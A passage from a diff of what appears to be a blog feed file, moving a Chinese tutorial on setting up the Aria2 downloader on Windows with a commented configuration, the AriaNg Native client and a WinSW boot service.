默认:6881-6999</span></span><br><span class="line"><span class="comment"># 因协议不同，可以与 BT 监听端口使用相同的端口，方便配置防火墙和端口转发策略。</span></span><br><span class="line">dht-listen-port=51413</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 下载种子文件(.torrent)自动开始下载，默认:true，可选如下</span></span><br><span class="line"><span class="comment"># true：保存种子文件</span></span><br><span class="line"><span class="comment"># false：仅下载种子文件</span></span><br><span class="line"><span class="comment"># mem：将种子保存在内存中</span></span><br><span class="line">follow-torrent=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># BT 下载最大连接数（单任务），运行时可修改</span></span><br><span class="line"><span class="comment"># 0 为不限制，默认：55</span></span><br><span class="line"><span class="comment"># 理想情况下连接数越多下载越快，但在实际情况是只有少部分连接到的做种者上传速度快，其余的上传慢或者不上传</span></span><br><span class="line"><span class="comment"># 如果不限制，当下载非常热门的种子或任务数非常多时可能会因连接数过多导致进程崩溃或网络阻塞</span></span><br><span class="line"><span class="comment"># 进程崩溃：如果设备 CPU 性能一般，连接数过多导致 CPU 占用过高，因资源不足 Aria2 进程会强制被终结</span></span><br><span class="line"><span class="comment"># 网络阻塞：在内网环境下，即使下载没有占满带宽也会导致其它设备无法正常上网</span></span><br><span class="line">bt-max-peers=64</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 打开DHT功能，PT需要禁用，默认:true</span></span><br><span class="line">enable-dht=<span class="literal">false</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 打开IPv6 DHT功能，PT需要禁用</span></span><br><span class="line"><span class="comment">#enable-dht6=false</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 本地节点查找，PT需要禁用，默认:false</span></span><br><span class="line"><span class="comment">#bt-enable-lpd=false</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 种子交换，PT需要禁用，默认:true</span></span><br><span class="line">enable-peer-exchange=<span class="literal">false</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># BT 下载期望速度值（单任务），运行时可修改</span></span><br><span class="line"><span class="comment"># 单位 K 或 M，默认：50K</span></span><br><span class="line"><span class="comment"># 下载速度低于此选项值时会临时提高连接数来获得更快的下载速度，不过前提是有更多的做种者可供连接</span></span><br><span class="line"><span class="comment"># 实测临时提高连接数没有上限，但不会像不做限制一样无限增加，会根据算法进行合理的动态调节</span></span><br><span class="line">bt-request-peer-speed-limit=5M</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 客户端伪装，PT需要</span></span><br><span class="line">peer-id-prefix=-TR2770-</span><br><span class="line">user-agent=Transmission/2.77</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 最小分享率。当种子的分享率达到此选项设置的值时停止做种</span></span><br><span class="line"><span class="comment"># 0 为一直做种, 默认：1.0</span></span><br><span class="line"><span class="comment"># 强烈建议将此选项设置为大于等于 1.0</span></span><br><span class="line">seed-ratio=1.0</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 最小做种时间（分钟）</span></span><br><span class="line"><span class="comment"># 设置为 0 时将在 BT 任务下载完成后停止做种</span></span><br><span class="line">seed-time=30</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 做种前检查文件哈希，默认：true</span></span><br><span class="line">bt-hash-check-seed=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 强制保存会话，即使任务已经完成，默认:false</span></span><br><span class="line"><span class="comment"># 较新的版本开启后会在任务完成后依然保留.aria2文件</span></span><br><span class="line"><span class="comment">#force-save=false</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 继续之前的BT任务时，无需再次校验，默认：false</span></span><br><span class="line">bt-seed-unverified=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 保存磁力链接元数据为种子文件(.torrent文件)，默认：false</span></span><br><span class="line">bt-save-metadata=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># BT tracker 服务器连接超时时间（秒）。默认：60</span></span><br><span class="line"><span class="comment"># 建立连接后，此选项无效，将使用 bt-tracker-timeout 选项的值</span></span><br><span class="line">bt-tracker-connect-timeout=45</span><br><span class="line"> </span><br><span class="line"><span class="comment"># BT tracker 服务器超时时间（秒）。默认：60</span></span><br><span class="line">bt-tracker-timeout=45</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 保存通过 WebUI(RPC) 上传的种子文件(.torrent)，默认：true</span></span><br><span class="line"><span class="comment"># 所有涉及种子文件保存的选项都建议开启，不保存种子文件有任务丢失的风险</span></span><br><span class="line"><span class="comment"># 通过 RPC 自定义临时下载目录可能不会保存种子文件</span></span><br><span class="line">rpc-save-upload-metadata=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># BT强制加密, 默认: false</span></span><br><span class="line"><span class="comment"># 启用后将拒绝旧的 BT 握手协议并仅使用混淆握手及加密</span></span><br><span class="line"><span class="comment"># 可以解决部分运营商对 BT 下载的封锁，且有一定的防版权投诉与迅雷吸血效果</span></span><br><span class="line"><span class="comment"># 此选项相当于后面两个选项(bt-require-crypto=true, bt-min-crypto-level=arc4)的快捷开启方式，但不会修改这两个选项的值</span></span><br><span class="line">bt-force-encryption=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># BT加密需求，默认：false</span></span><br><span class="line"><span class="comment"># 启用后拒绝与旧的 BitTorrent 握手协议(\19BitTorrent protocol)建立连接，始终使用混淆处理握手。</span></span><br><span class="line"><span class="comment">#bt-require-crypto=true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># BT最低加密等级，可选：plain（明文），arc4（加密），默认：plain</span></span><br><span class="line"><span class="comment">#bt-min-crypto-level=arc4</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">### 高级选项 ###</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 启用异步 DNS 功能，默认：true</span></span><br><span class="line">async-dns=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 指定异步 DNS 服务器列表，未指定则从 /etc/resolv.conf 中读取。</span></span><br><span class="line">async-dns-server=119.29.29.29,223.5.5.5,1.1.1.1,8.8.8.8,114.114.114.114</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 指定单个网络接口，可能的值：接口，IP地址，主机名</span></span><br><span class="line"><span class="comment"># 如果接口具有多个 IP 地址，则建议指定 IP 地址。</span></span><br><span class="line"><span class="comment"># 已知指定网络接口会影响依赖本地 RPC 的连接的功能场景，即通过 localhost 和 127.0.0.1 无法与 Aria2 服务端进行讯通。</span></span><br><span class="line"><span class="comment">#interface=</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 指定多个网络接口，多个值之间使用逗号(,)分隔。</span></span><br><span class="line"><span class="comment"># 使用 interface 选项时会忽略此项。</span></span><br><span class="line"><span class="comment">#multiple-interface=</span></span><br></pre></td></tr></table></figure>
+
+<p>以上配置文件可以全选复制保存，只需要额外注意以下几项配置，根据自己的情况进行更改：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">dir = 下载路径</span><br><span class="line">log = 日志 Aria2.log 文件的保存路径</span><br><span class="line">input-file = 读取下载任务的 aria2.session 文件路径</span><br><span class="line">save-session = 会话 aria2.session 文件保存路径</span><br><span class="line">file-allocation = 文件预分配模式 none|prealloc|trunc|falloc</span><br><span class="line">rpc-secret = 自定义的 RPC 授权密钥</span><br></pre></td></tr></table></figure>
+
+<p>配置文件全部改好保存后，打开终端<code>PowerShell.exe</code>，执行以下命令查看配置是否生效：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入 Aria2 核心文件目录</span></span><br><span class="line"><span class="built_in">cd</span> C:\others\aria2</span><br><span class="line"><span class="comment"># 根据刚才保存的配置运行 Aria2</span></span><br><span class="line">./aria2c.exe --conf-path=aria2.conf</span><br></pre></td></tr></table></figure>
+
+<p>当终端显示以下信息后，则表示 Aria2 运行成功：</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262322081.png" alt="img"></p>
+<h3 id="安装-Win10-PC-端的-Aria2-客户端-AriaNg-Native（我们来给Aria2添加一个界面，方便操作）"><a href="#安装-Win10-PC-端的-Aria2-客户端-AriaNg-Native（我们来给Aria2添加一个界面，方便操作）" class="headerlink" title="安装 Win10 PC 端的 Aria2 客户端 AriaNg Native（我们来给Aria2添加一个界面，方便操作）"></a>安装 Win10 PC 端的 Aria2 客户端 AriaNg Native（我们来给Aria2添加一个界面，方便操作）</h3><p>客户端 AriaNg Native 的下载地址：</p>
+<p><a href="https://github.com/mayswind/AriaNg-Native/releases">https://github.com/mayswind/AriaNg-Native</a></p>
+<p>选择对应系统的版本进行下载，这里我选择的是64位绿色解压版：</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262322498.png" alt="img"></p>
+<p>客户端使用非常简单，将下载下来的压缩包解压后保存到任意位置，然后双击<code>AriaNg Native.exe</code>即可运行程序。</p>
+<p>程序打开后，我们还需要进行配置，让客户端和程序核心进行链接，如图：</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262324095.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262324225.png" alt="img"></p>
+<p>看到<code>已链接</code>字样则表示成功。</p>
+<h3 id="设置后台静默启动-Aria2"><a href="#设置后台静默启动-Aria2" class="headerlink" title="设置后台静默启动 Aria2"></a>设置后台静默启动 Aria2</h3><p>截至到以上设置，虽然可以正常使用，但是每次都需要手动打开终端运行核心文件，且还要一直保持终端运行，始终不太方便，因此可以使用<code>WinSW</code>这个工具进行以下配置，让电脑每次开机后自动在后台运行，我们要用的时候只用打开客户端即可。</p>
+<p>WinSw 下载地址：</p>
+<p><a href="https://github.com/winsw/winsw/releases">https://github.com/winsw/winsw</a></p>
+<p>这里我选择64位版本，并一并下载配置 .xml 的模板文件：</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262324643.png" alt="img"></p>
+<p>选择任意位置创建一个文件夹，比如命名为<code>WinSW-Aria2c</code>，将刚才下载的<code>WinSW-x64.exe</code>和<code>sample-minimal.xml</code>文件放到新建的文件夹里，然后用文本编辑器打开<code>sample-minimal.xml</code>，对配置进行修改：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">&lt;!-- 系统进程中显示的服务ID--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>Aria2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 服务名称 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Aria2后台运行<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 这里是要运行服务的介绍，随便写 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Aria2后台运行服务随开机自启动<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">&lt;!-- 需要执行的命令内容 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">executable</span>&gt;</span>C:\others\aria2\aria2c.exe<span class="tag">&lt;/<span class="name">executable</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">arguments</span>&gt;</span>--conf-path=C:\others\aria2\aria2.conf<span class="tag">&lt;/<span class="name">arguments</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">       可以定义一系列操作，如果托管可执行文件失败，则应执行以下操作：</span></span><br><span class="line"><span class="comment">       restart 服务重启</span></span><br><span class="line"><span class="comment">       reboot 系统重启</span></span><br><span class="line"><span class="comment">       none 无</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">onfailure</span> <span class="attr">action</span>=<span class="string">&quot;restart&quot;</span> <span class="attr">delay</span>=<span class="string">&quot;60 sec&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">onfailure</span> <span class="attr">action</span>=<span class="string">&quot;restart&quot;</span> <span class="attr">delay</span>=<span class="string">&quot;120 sec&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">logmode</span>&gt;</span>reset<span class="tag">&lt;/<span class="name">logmode</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>修改好后，将<code>.exe</code>和<code>.xml</code>的文件名改成统一名称，格式后缀不要改动，然后<strong>以管理员身份运行</strong>终端<code>PowerShell.exe</code>，执行以下指令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.\WinSW-Aria2c.exe install </span><br></pre></td></tr></table></figure>
+
+<p>如下图所示，就表示后台自启动服务已经安装成功：</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262325544.png" alt="img"></p>
+<p>然后按键盘<code>Win</code>+<code>r</code>快捷键打开运行界面，输入<code>services.msc</code>进入服务列表，如图所示：</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262326157.png" alt="img"></p>
+<p>找到 Aria2 服务，双击打开服务详情，然后点击<code>启动</code>：</p>
+<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262326770.png" alt="img"></p>
+<p>以后每次电脑开机后都会默默的后台运行，省心又方便。</p>
+]]></content>
+      <categories>
+        <category>技术</category>
+        <category>Win</category>
+      </categories>
+      <tags>
+        <tag>Aria2</tag>
       </tags>
   </entry>
   <entry>
@@ -1176,66 +1276,6 @@
       </tags>
   </entry>
   <entry>
-    <title>在Win环境安装下载神器Aria2</title>
-    <url>/2023/01/26/%E5%9C%A8Win%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8Aria2/</url>
-    <content><![CDATA[<h3 id="Aria2-介绍"><a href="#Aria2-介绍" class="headerlink" title="Aria2 介绍"></a>Aria2 介绍</h3><p>Aria2 是一个多平台轻量级，支持 HTTP、FTP、BitTorrent 等多协议、多来源的命令行下载工具。Aria2 可以从多个来源、多个协议下载资源，最大的程度上利用了你的带宽。Aria2 有着非常小的资源占用，在关闭磁盘缓存的情况下，物理内存占用通常为 4M（正常 HTTP&#x2F;FTP 下载的情况下），BitTorrent 下载每秒2.8M&#x2F;S的情况下，CPU 占有率约为 6%。Aria2 支持 JSON-RPC 和 XML-RPC 接口远程调用。总之一句话就是简洁，<strong>简</strong>到连个界面都没有。</p>
-<h3 id="Aria2-核心程序"><a href="#Aria2-核心程序" class="headerlink" title="Aria2 核心程序"></a>Aria2 核心程序</h3><p>GitHub 下载地址：</p>
-<p><a href="https://github.com/aria2/aria2/releases">https://github.com/aria2/aria2</a></p>
-<p>找到最新版的核心文件，选择适合的版本进行下载：</p>
-<p><img src="https://raw.githubusercontent.com/movejian/images/main/movejian/images202301262322405.png" alt="img"></p>
-<p>这里我选择的是64位的版本，下载后解压缩文件，将文件夹转移到你希望放置程序的地方（尽量选择非中文的目录路径），比如我这里将文件夹改名并放在<code>C:\others\aria2</code>。</p>
-<h3 id="创建相关文件"><a href="#创建相关文件" class="headerlink" title="创建相关文件"></a>创建相关文件</h3><p>放置好 Aria2 的核心程序文件夹后，还需要在文件夹里新建3个空文件，这里可以使用<code>记事本.exe</code>来新建，保存的时候注意<strong>文件格式</strong>后缀：</p>
-<blockquote>
-<p>Aria2.log （日志文件）<br>aria2.session （用于记录下载历史，以便断点续传）<br>aria2.conf （配置文件）</p>
-</blockquote>
-<h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><p>用文本编辑器打开刚才新建的<code>aria2.conf</code>文件，复制粘贴下面的代码：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 井号开头的为注释内容，选项都有相应的注释说明，根据需要修改</span></span><br><span class="line"><span class="comment"># 被注释的选项填写的是默认值，建议在需要修改时再删掉注释</span></span><br><span class="line"><span class="comment"># 该配置引用了部分&#x27;Aria2完美配置&#x27; https://github.com/P3TERX/aria2.conf</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#################</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">### 文件保存设置 ###</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 下载目录，可使用绝对路径或相对路径，务必修改成自己的下载路径</span></span><br><span class="line"><span class="built_in">dir</span>=E:\Aria2Download</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 日志文件的保存路径</span></span><br><span class="line"><span class="built_in">log</span>=C:\others\aria2\Aria2.<span class="built_in">log</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 启用磁盘缓存，0为禁用缓存，默认:16M，最大64M</span></span><br><span class="line"><span class="comment"># 磁盘缓存的作用是把下载的数据块临时存储在内存中，然后集中写入硬盘，以减少磁盘 I/O ，提升读写性能，延长硬盘寿命</span></span><br><span class="line"><span class="comment"># 建议在有足够的内存空闲情况下适当增加，但不要超过剩余可用内存空间大小</span></span><br><span class="line"><span class="comment"># 此项值仅决定上限，实际对内存的占用取决于网速带宽和设备性能等其它因素</span></span><br><span class="line">disk-cache=32M</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 文件预分配可以帮助机械硬盘有效降低磁盘碎片，提升磁盘读写性能，延长磁盘寿命</span></span><br><span class="line"><span class="comment"># 默认：prealloc，可选：none，prealloc，trunc，falloc</span></span><br><span class="line"><span class="comment"># prealloc 分配速度慢，falloc 和 trunc 则需要文件系统和内核支持，不推荐使用</span></span><br><span class="line"><span class="comment"># btrfs、xfs、NTFS（仅 MinGW 编译版本）等文件系统建议设置为 falloc</span></span><br><span class="line"><span class="comment"># Ext3/4（具有扩展支持）建议 trunc</span></span><br><span class="line"><span class="comment"># 固态硬盘不需要预分配，只建议设置为 none，否则可能会导致双倍文件大小的数据写入，从而影响寿命</span></span><br><span class="line"><span class="comment"># MacOS 需要注释此项</span></span><br><span class="line">file-allocation=prealloc</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 文件预分配大小限制</span></span><br><span class="line"><span class="comment"># 小于此选项值大小的文件不预分配空间，单位 K 或 M，默认：5M</span></span><br><span class="line"><span class="comment"># no-file-allocation-limit=32M</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 断点续传</span></span><br><span class="line"><span class="built_in">continue</span>=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 始终尝试断点续传，无法断点续传则终止下载，默认：true</span></span><br><span class="line">always-resume=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 不支持断点续传的 URI 数值，当 always-resume=false 时生效</span></span><br><span class="line"><span class="comment"># 达到这个数值将从头开始下载，值为 0 时所有 URI 不支持断点续传时才从头开始下载</span></span><br><span class="line"><span class="comment"># max-resume-failure-tries=0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取服务器文件时间，默认:false</span></span><br><span class="line">remote-time=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">### 进度保存相关设置 ###</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 从会话文件中读取下载任务</span></span><br><span class="line">input-file=C:\others\aria2\aria2.session</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 会话文件保存路径</span></span><br><span class="line"><span class="comment"># Aria2 退出时或指定的时间间隔会保存`错误/未完成`的下载任务到会话文件</span></span><br><span class="line">save-session=C:\others\aria2\aria2.session</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 任务状态改变后保存会话的间隔时间（秒），0 为仅在进程正常退出时保存，默认:0</span></span><br><span class="line"><span class="comment"># 为了及时保存任务状态、防止任务丢失，此项值只建议设置为 1</span></span><br><span class="line">save-session-interval=1</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 自动保存任务进度到控制文件(*.aria2)的间隔时间（秒）</span></span><br><span class="line"><span class="comment"># 0 为仅在进程正常退出时保存，默认：60</span></span><br><span class="line"><span class="comment"># 此项值也会间接影响从内存中把缓存的数据写入磁盘的频率</span></span><br><span class="line"><span class="comment"># 想降低磁盘 IOPS (每秒读写次数)则提高间隔时间</span></span><br><span class="line"><span class="comment"># 想在意外非正常退出时尽量保存更多的下载进度则降低间隔时间</span></span><br><span class="line"><span class="comment"># 非正常退出：进程崩溃、系统崩溃、SIGKILL 信号、设备断电等</span></span><br><span class="line">auto-save-interval=20</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 强制保存，即使任务已完成也保存信息到会话文件，默认：false</span></span><br><span class="line"><span class="comment"># 开启后会在任务完成后保留 .aria2 文件，文件被移除且任务存在的情况下重启后会重新下载</span></span><br><span class="line"><span class="comment"># 关闭后已完成的任务列表会在重启后清空</span></span><br><span class="line">force-save=<span class="literal">false</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">### 下载连接相关 ###</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 文件未找到重试次数，默认：0 (禁用)</span></span><br><span class="line"><span class="comment"># 重试时同时会记录重试次数，所以也需要设置 max-tries 这个选项</span></span><br><span class="line">max-file-not-found=5</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 最大尝试次数，0 表示无限，默认:5</span></span><br><span class="line">max-tries=5</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 重试等待时间（秒），默认:0 (禁用)</span></span><br><span class="line">retry-wait=15</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 连接超时时间（秒）。默认：60</span></span><br><span class="line">connect-timeout=30</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 超时时间（秒）。默认：60</span></span><br><span class="line"><span class="built_in">timeout</span>=30</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 最大同时下载任务数，运行时可修改，默认:5</span></span><br><span class="line"><span class="comment">#max-concurrent-downloads=5</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 同一服务器最大连接线程数，添加时可指定，默认：1</span></span><br><span class="line"><span class="comment"># 最大值为 16，且受限于单任务最大连接线程数 split 所设定的值</span></span><br><span class="line">max-connection-per-server=16</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 单个任务最大线程数，添加时可指定，默认:5</span></span><br><span class="line"><span class="built_in">split</span>=8</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 最小文件分片大小，添加时可指定，取值范围1M -1024M，默认：20M</span></span><br><span class="line"><span class="comment"># 比如此项值为 10M，当文件为 20MB 会分成两段并使用两个来源下载，文件为 15MB 则只使用一个来源下载</span></span><br><span class="line"><span class="comment"># 理论上值越小使用下载分段就越多，所能获得的实际线程数就越大，下载速度就越快，但受限于所下载文件服务器的策略</span></span><br><span class="line">min-split-size=8M</span><br><span class="line"> </span><br><span class="line"><span class="comment"># HTTP/FTP 下载分片大小，所有分割都必须是此项值的倍数</span></span><br><span class="line"><span class="comment"># 最小值为 1M (增强版为 1K)，默认：1M</span></span><br><span class="line">piece-length=1M</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 允许分片大小变化，默认：false</span></span><br><span class="line"><span class="comment"># false：当分片大小与控制文件中的不同时将会中止下载</span></span><br><span class="line"><span class="comment"># true：丢失部分下载进度继续下载</span></span><br><span class="line">allow-piece-length-change=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 全局最大下载速度限制，运行时可修改，默认：0 (无限制)</span></span><br><span class="line">max-overall-download-limit=0</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 全局最大上传速度限制，运行时可修改，默认：0 (无限制)</span></span><br><span class="line"><span class="comment"># 设置过低可能影响 BT 下载速度</span></span><br><span class="line">max-overall-upload-limit=64K</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 单任务下载速度限制，默认：0 (无限制)</span></span><br><span class="line">max-download-limit=0</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 单任务上传速度限制，默认：0 (无限制)</span></span><br><span class="line">max-upload-limit=32K</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 禁用 IPv6，默认:false</span></span><br><span class="line">disable-ipv6=<span class="literal">false</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># URI 复用，默认: true</span></span><br><span class="line">reuse-uri=<span class="literal">false</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 允许覆盖，当相关控制文件(.aria2)不存在时从头开始重新下载，默认：false</span></span><br><span class="line">allow-overwrite=<span class="literal">false</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 文件自动重命名，此选项仅在 HTTP(S)/FTP 下载中有效</span></span><br><span class="line"><span class="comment"># 新文件名在名称之后扩展名之前加上一个点和一个数字（1..9999），默认：true</span></span><br><span class="line">auto-file-renaming=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">### 客户端伪装 ###</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 自定义 User Agent</span></span><br><span class="line">user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.47</span><br><span class="line"> </span><br><span class="line"><span class="comment">### RPC相关设置 ###</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 启用 JSON-RPC/XML-RPC 服务器，默认：false</span></span><br><span class="line">enable-rpc=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 接受所有远程请求，默认：false</span></span><br><span class="line">rpc-allow-origin-all=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 允许外部访问，默认：false</span></span><br><span class="line">rpc-listen-all=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 事件轮询方式</span></span><br><span class="line"><span class="comment"># 可选：epoll、kqueue、port、poll、select，不同系统默认值不同</span></span><br><span class="line"><span class="comment">#event-poll=select</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># RPC 监听端口，默认：6800</span></span><br><span class="line">rpc-listen-port=6800</span><br><span class="line"> </span><br><span class="line"><span class="comment"># RPC 最大请求大小</span></span><br><span class="line">rpc-max-request-size=10M</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 设置的 RPC 授权密钥，取代 --rpc-user 和 --rpc-passwd 选项</span></span><br><span class="line">rpc-secret=abcde12345</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 是否启用 RPC 服务的 SSL/TLS 加密，默认：false</span></span><br><span class="line"><span class="comment"># 启用加密后必须使用 https 或者 wss 协议连接</span></span><br><span class="line"><span class="comment"># 不推荐开启，建议使用 web server 反向代理</span></span><br><span class="line"><span class="comment"># 比如 Nginx、Caddy，灵活性更强</span></span><br><span class="line"><span class="comment">#rpc-secure=true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 在 RPC 服务中启用 SSL/TLS 加密时的证书文件,</span></span><br><span class="line"><span class="comment"># 使用 PEM 格式时，您必须通过 --rpc-private-key 指定私钥</span></span><br><span class="line"><span class="comment">#rpc-certificate=/path/to/certificate.pem</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 在 RPC 服务中启用 SSL/TLS 加密时的私钥文件</span></span><br><span class="line"><span class="comment">#rpc-private-key=/path/to/certificate.key</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">### BT/PT下载相关 ###</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># BT 监听端口(TCP), 默认：6881-6999</span></span><br><span class="line"><span class="comment"># 直通外网的设备，比如 VPS ，务必配置防火墙和安全组策略允许此端口入站</span></span><br><span class="line"><span class="comment"># 内网环境的设备，比如 NAS ，除了防火墙设置，还需在路由器设置外网端口转发到此端口</span></span><br><span class="line">listen-port=51413</span><br><span class="line"> </span><br><span class="line"><span class="comment"># DHT 网络与 UDP tracker 监听端口(UDP), 默认:6881-6999</span></span><br><span class="line"><span class="comment"># 因协议不同，可以与 BT 监听端口使用相同的端口，方便配置防火墙和端口转发策略。</span></span><br><span class="line">dht-listen-port=51413</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 下载种子文件(.torrent)自动开始下载，默认:true，可选如下</span></span><br><span class="line"><span class="comment"># true：保存种子文件</span></span><br><span class="line"><span class="comment"># false：仅下载种子文件</span></span><br><span class="line"><span class="comment"># mem：将种子保存在内存中</span></span><br><span class="line">follow-torrent=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># BT 下载最大连接数（单任务），运行时可修改</span></span><br><span class="line"><span class="comment"># 0 为不限制，默认：55</span></span><br><span class="line"><span class="comment"># 理想情况下连接数越多下载越快，但在实际情况是只有少部分连接到的做种者上传速度快，其余的上传慢或者不上传</span></span><br><span class="line"><span class="comment"># 如果不限制，当下载非常热门的种子或任务数非常多时可能会因连接数过多导致进程崩溃或网络阻塞</span></span><br><span class="line"><span class="comment"># 进程崩溃：如果设备 CPU 性能一般，连接数过多导致 CPU 占用过高，因资源不足 Aria2 进程会强制被终结</span></span><br><span class="line"><span class="comment"># 网络阻塞：在内网环境下，即使下载没有占满带宽也会导致其它设备无法正常上网</span></span><br><span class="line">bt-max-peers=64</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 打开DHT功能，PT需要禁用，默认:true</span></span><br><span class="line">enable-dht=<span class="literal">false</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 打开IPv6 DHT功能，PT需要禁用</span></span><br><span class="line"><span class="comment">#enable-dht6=false</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 